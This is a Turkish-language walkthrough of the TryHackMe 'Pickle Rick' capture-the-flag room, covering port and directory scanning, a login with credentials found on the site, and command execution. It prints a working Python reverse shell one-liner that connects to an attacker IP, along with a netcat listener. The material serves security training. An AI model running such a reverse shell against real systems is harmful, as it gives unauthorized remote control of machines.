## Giriş
Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/picklerick">Pickle Rick</a> makinesinin çözümünü paylaşacağım.


Bu Rick ve Morty temalı mücadele, bir web sunucusundan yararlanmanızı ve Rick'in iksirini yapmasına ve kendisini turşudan insana dönüştürmesine yardımcı olacak üç malzeme bulmanızı gerektirir.

## Görev 1 Pickle Rick
1.
```
Rick'in ihtiyacı olan ilk malzeme nedir?
```

Her zamanki gibi nmap taraması ile başlayalım

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a1.png?raw=true)

80 portunda web sitesi çalıştığnı görüyoruz.


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a2.png?raw=true)

Sayfanın kaynak koduna baktığımız zaman kullanıcı adını görüyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a3.png?raw=true)

Gobuster çalıştırıp gizli dizin arayalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a4.png?raw=true)

robots.txt login.php ve portal.php sayfalarını bulduk.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a5.png?raw=true)

robot.txt yi açtığımızda karşımıza çıkan sayfa. Şifre olabileceğini düşünerek login sayfasına giriş yapmayı deniyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a6.png?raw=true)

Giriş yapmayı başardım.
> R1ckRul3s:Wubbalubbadubdub

Komut çalıştırmayı deneyelim.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a7.png?raw=true)
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a8.png?raw=true)

Bu dosyanın içeriği cat komutu ile kontrol edilmek istendiğinde komut engelleniyor

Konsola python reverse shell komutu yazmayı deniyorum. [Reverse Shell Generator](https://www.revshells.com/) kullanıyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Pickle_Rick/images/a9.png?raw=true)

> export RHOST="10.14.61.127";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

netcat çalıştırmayı unutmayın.

> nc -nvlp 1234

Makineye girmeyi başardık.

















